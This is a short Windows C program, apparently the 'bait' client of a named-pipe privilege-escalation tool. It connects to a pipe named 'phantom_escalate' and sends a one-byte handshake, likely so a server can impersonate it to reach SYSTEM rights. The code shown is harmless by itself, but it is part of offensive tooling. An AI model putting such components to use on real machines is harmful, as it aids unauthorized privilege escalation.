#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\phantom_escalate"

int main() {
    printf("[*] SYSTEM bait starting...\n");

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 10; i++) {
        hPipe = CreateFileW(PIPE_NAME, GENERIC_WRITE, 0, NULL,
            OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE) break;
        Sleep(1000);
    }

    if (hPipe != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hPipe, "X", 1, &written, NULL);
        printf("[+] Handshake sent to server.\n");
        CloseHandle(hPipe);
    } else {
        printf("[-] Bait failed to connect: %lu\n", GetLastError());
    }

    return 0;
}
